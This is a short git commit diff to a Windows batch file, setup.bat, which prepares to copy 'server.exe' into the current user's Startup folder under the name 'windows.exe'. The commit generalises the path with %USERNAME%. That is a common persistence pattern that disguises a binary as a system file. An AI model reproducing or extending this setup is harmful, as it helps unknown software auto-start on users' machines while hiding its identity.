c58efaa6487a05fd3853f49392e194ea891280e4
SpaceAgeX <aaryeh27@palmertrinity.org>
2024-10-31 13:40:38 -0400

    setup

--- setup.bat
+++ setup.bat
@@ -1,6 +1,6 @@
 @echo off
 set sourceFilePath="server.exe"
-set destFolder="C:\Users\aaryeh27\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+set destFolder="C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 set newFileName="windows.exe"
 
 :: Copy the file to the destination folder
